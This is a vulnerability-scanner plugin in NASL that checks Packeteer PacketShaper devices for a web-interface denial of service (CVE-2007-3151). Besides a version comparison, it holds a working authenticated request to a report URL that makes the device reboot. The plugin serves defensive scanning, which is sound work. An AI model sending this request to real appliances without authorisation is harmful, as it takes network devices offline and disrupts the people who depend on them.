if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80030" );
	script_version( "2021-03-24T10:08:26+0000" );
	script_tag( name: "last_modification", value: "2021-03-24 10:08:26 +0000 (Wed, 24 Mar 2021)" );
	script_tag( name: "creation_date", value: "2008-10-24 20:15:31 +0200 (Fri, 24 Oct 2008)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2007-3151" );
	script_bugtraq_id( 24388 );
	script_xref( name: "OSVDB", value: "37230" );
	script_name( "Packeteer PacketShaper Web Denial of Service" );
	script_family( "Web application abuses" );
	script_category( ACT_MIXED_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2008 nnposter" );
	script_dependencies( "packeteer_web_version.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "bluecoat_packetshaper/installed" );
	script_tag( name: "summary", value: "Packeteer PacketShaper is susceptible to a denial of service
  vulnerability in the web management interface." );
	script_tag( name: "impact", value: "Requesting a specificURL will cause the device to reboot. The
  user must first log in but even read-only access is sufficient." );
	script_tag( name: "solution", value: "Restrict network access to the device management interfaces." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/470835/30/0/threaded" );
	script_tag( name: "solution_type", value: "Mitigation" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
if(!get_kb_item( "bluecoat_packetshaper/installed" )){
	exit( 0 );
}
func set_cookie( data, cookie ){
	var EOL, req;
	EOL = "\r\n";
	req = ereg_replace( string: data, pattern: EOL + "Cookie:[^\r\n]+", replace: "" );
	req = ereg_replace( string: req, pattern: EOL + EOL, replace: EOL + cookie + EOL );
	return req;
}
func get_version_snmp(  ){
	var sys, match, ver;
	sys = snmp_get_sysdescr( port: 161 );
	if(!sys){
		return;
	}
	match = eregmatch( pattern: "^Packeteer PacketShaper ([A-Za-z0-9.]+)", string: sys );
	ver = match[1];
	if(!ver){
		return;
	}
	return ver;
}
port = http_get_port( default: 80 );
product = get_kb_item( "www/" + port + "/packeteer" );
if(!product || product != "PacketShaper"){
	exit( 0 );
}
if(safe_checks()){
	KNOWN_BROKEN_VERSION = "7.5.1g1";
	version = get_kb_item( "www/" + port + "/packeteer/version" );
	if(version && IsMatchRegexp( version, "^([0-6]\\.|7\\.([0-4]\\.|5\\.(0|1([a-f]|g0))))" )){
		report = NASLString( "The vulnerability has not been tested. The assessment is based solely on the device software version, which is ", version, "." );
		security_message( port: port, data: report );
	}
	exit( 0 );
}
cookie = get_kb_item( "/tmp/http/auth/" + port );
if(!cookie){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
req = http_get( item: "/rpttop.htm?OP.MEAS.DATAQUERY=&MEAS.TYPE=", port: port );
resp = http_send_recv( port: port, data: set_cookie( data: req, cookie: cookie ) );
if(!http_is_dead( port: port )){
	exit( 0 );
}
security_message( port );

